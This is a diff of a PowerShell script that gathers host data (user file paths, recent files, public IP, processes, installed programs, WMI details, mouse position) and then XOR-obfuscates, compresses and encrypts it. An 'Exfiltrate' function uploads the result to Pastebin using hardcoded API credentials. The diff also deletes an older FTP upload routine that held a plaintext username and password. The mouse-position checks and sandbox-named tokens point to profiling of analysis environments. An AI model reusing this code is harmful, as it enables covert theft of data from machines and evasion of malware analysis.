@@ -49,6 +49,8 @@ function Get_Files() {
 	$folders += $home + "\Music"
 	$folders += $home + "\Pictures"
 	$folders += $home + "\Videos"
+	$folders += $home + "\Recent"
+	$folders += $home + "\AppData\Roaming\Microsoft\Windows\Recent"
 
 	$folders += $home + "\My Documents"
 	$folders += $home + "\My Music"
@@ -62,15 +64,15 @@ function Get_Files() {
 			For($j=0; $j -lt $obj.Length; $j++) {
 				# avoid .lnk shortcuts, etc
 				if ($obj[$j].DirectoryName) {
-					# hack because Get-ChildItem recursively does breadth first, then depth
-					#$output += '"File_' +$j+ '_' +$obj[$j].DirectoryName+ '":"' +$obj[$j].Name+ '",'
-					$output += '"File_' +$j+ '":"' +$obj[$j].FullName+ '",'
+					# hack because Get-ChildItem recursively does breadth first, then depth --> messy output
+					$output += '"File_' +$i+ '_' +$j+ '":"' +$obj[$j].FullName+ '",'
 				}
 			}
 		}
 		catch {
 			$ErrorMessage = $_.Exception.Message
 			$output += '"Error_' +$error_counter+ '":"' + $ErrorMessage + '",'
+			$error_counter += 1
 		}
 	}
 	# remove trailing ',' character
@@ -116,7 +118,7 @@ function Get_Info() {
     $output = " { "
     $output += " `"Token`": `"" + $Token + "`","
     $output += " `"SnapshotDate`": `"" + $(Get-Date -format u) + "`","
-	#$output += " `"PublicIPv4`": `"" + $(Get_Public_IP) + "`""
+	$output += " `"PublicIPv4`": `"" + $(Get_Public_IP) + "`""
 
 	$output += '}'
 	return $output
@@ -147,6 +149,29 @@ function Get_Installed_Programs_Registry(){
 	return $output
 }
 
+function Get_Mouse_Position()
+{
+	Param ($timing)
+
+	$output = '{"Mouse Position ' +$($timing)+ '" :'
+
+	Try
+	{
+		Add-Type -AssemblyName System.Windows.Forms
+		$Mouse = [System.Windows.Forms.Cursor]::Position
+		$x = $Mouse.x
+		$y = $Mouse.y
+		$output += '"(' +$x+ ',' +$y+ ')"'
+	}
+	Catch
+	{
+		$ErrorMessage = $_.Exception.Message
+		$output += '"$ErrorMessage"'
+	}
+	$output += '}'
+
+	return $output
+}
 function Get_Procs() {
 	$output = '{"Running Processes":'
 	$output += '['
@@ -447,6 +472,8 @@ function WMI_Query() {
 				$output += '{'
 				ForEach ($prop in $props) {
 					$w.$prop = $w.$prop -replace '"', "'"
+					# SOMTIMES Microsoft decides to add a newline char to the end of their descriptions >_>
+					$w.$prop = $w.$prop -replace "`r`n"
 					$output += '"' + $prop + '":"' + $w.$prop + '",'
 				}
 				# remove trailing ',' character
@@ -501,30 +528,6 @@ function Zdcom() {
 function Zend() {
 	Param ($str)
 
-	<#
-	$username = 'crazyrockinsushi'
-	$password = '$5OffToday' # $5Off
-	$server = "ftp://ftp.drivehq.com/"
-	$file = 'zinfo.txt'
-
-	Set-Content -Path $file -Value $str
-
-	$ftp = [System.Net.FtpWebRequest]::Create($server+$file)
-	$ftp = [System.Net.FtpWebRequest]$ftp
-	$ftp.Method = [System.Net.WebRequestMethods+Ftp]::UploadFile
-	$ftp.Credentials = new-object System.Net.NetworkCredential($username, $password)
-	$ftp.UseBinary = $true
-	$ftp.UsePassive = $true
-	$content = [System.IO.File]::ReadAllBytes($file)
-	$ftp.ContentLength = $content.Length
-	$rs = $ftp.GetRequestStream()
-	$rs.Write($content, 0, $content.Length)
-	$rs.Close()
-	$rs.Dispose()
-
-	Remove-Item $file
-	#>
-
 	$url = "http://localhost/pocky/index.php?"
 	$request = [System.Net.WebRequest]::Create($url)
 	$request.Method = "POST"
@@ -547,7 +550,7 @@ function ZendPasteBin() {
 	Param ($str,$id)
 
     $dev_key = 'c6503f192c60310073d1ec3004e4c206'
-    $password = 'inv0k3rexfil1'
+    $password = '***'
     $username = 'fortiml'
 
     $Key = "lqZQV1WiMxmK542JitLHds+JZzwrCVG7yA848xSQJ3E="
@@ -557,8 +560,23 @@ function ZendPasteBin() {
     return $info
 }
 
+function Zor() {
+	Param ($str)
+
+	$encoder = [System.Text.Encoding]::UTF8
+	$bytes = $encoder.Getbytes($str)
+
+	for($i=0; $i -lt $bytes.count ; $i++) {
+		$bytes[$i] = $bytes[$i] -bxor 0x13
+	}
+
+	$str = $encoder.GetString($bytes)
+
+	return $str
+}
+
 function Exfiltrate {
-    Param ( 
+    Param (
         [Parameter(Position = 0, Mandatory = $True)]
         [String]
         $ID,
@@ -566,19 +584,19 @@ function Exfiltrate {
         [Parameter(Position = 1, Mandatory = $True)]
         [String]
         $Data,
-        
+
         [Parameter(Position = 2, Mandatory = $True)]
         [String]
         $Key,
-    
+
         [Parameter(Position = 3, Mandatory = $False)]
         [String]
         $dev_key,
-    
+
         [Parameter(Position = 4, Mandatory = $False)]
         [String]
         $visibility,
-        
+
         [Parameter(Position = 5, Mandatory = $False)]
         [String]
         $username,
@@ -586,26 +604,26 @@ function Exfiltrate {
         [Parameter(Position = 6, Mandatory = $False)]
         [String]
         $password,
-    
+
         [Parameter(Position = 7, Mandatory = $False)]
         [String]
         $URL
 
     )
-        
 
-    function post_http($url, $parameters) { 
-        $http_request = New-Object -ComObject Msxml2.XMLHTTP 
-        $http_request.open("POST", $url, $false) 
-        $http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded") 
-        $http_request.setRequestHeader("Content-length", $parameters.length); 
-        $http_request.setRequestHeader("Connection", "close") 
-        $http_request.send($parameters) 
+
+    function post_http($url, $parameters) {
+        $http_request = New-Object -ComObject Msxml2.XMLHTTP
+        $http_request.open("POST", $url, $false)
+        $http_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded")
+        $http_request.setRequestHeader("Content-length", $parameters.length);
+        $http_request.setRequestHeader("Connection", "close")
+        $http_request.send($parameters)
 
         return $http_request.responseText,$http_request.status
-    } 
-        
-        $session_key,$code = post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
+    }
+
+        $session_key,$code = post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password"
         $http_oky_codes = 200,201,202
 
         if ($code.ToString() -like '20*')
@@ -616,11 +634,11 @@ function Exfiltrate {
                 return $code
             }
             else{
-                
+
                 $vis_code = @{"public"=0;"unlisted"=1;"private"=2}
                 $vis_choice = $vis_code[$visibility]
-                $link,$code = post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$ID&api_paste_code=$Data&api_paste_private=$vis_choice" 
-                
+                $link,$code = post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$ID&api_paste_code=$Data&api_paste_private=$vis_choice"
+
                 if ($code.ToString() -like '20*')
                 {
                     return $link
@@ -638,9 +656,12 @@ function Exfiltrate {
 # supress noisy errors
 $ErrorActionPreference = 'stop'
 
+$id = "Joe"
 # manually build the JSON output string
 $out = '['
-$out += Get_Info -Token "Win7_32bit_anyrun"
+$out += Get_Info -Token $id
+$out += ','
+$out += Get_Mouse_Position "Initial"
 $out += ','
 $out += Get_Hyper_V
 $out += ','
@@ -657,12 +678,15 @@ $out += ','
 $out += Get_Files
 $out += ','
 $out += Get_Installed_Programs_Registry
+$out += ','
+$out += Get_Mouse_Position "Final"
 $out += ']'
 $out = $out -replace '\\', '\\'
 
 #Write-Host $out
 
+$out = Zor $out
 $out = Zcompress $out
 $out = Zencrypt $out
-$link = ZendPasteBin $out "Win7_32_Sandbox"
+$link = ZendPasteBin $out $id
 Write-Host $link
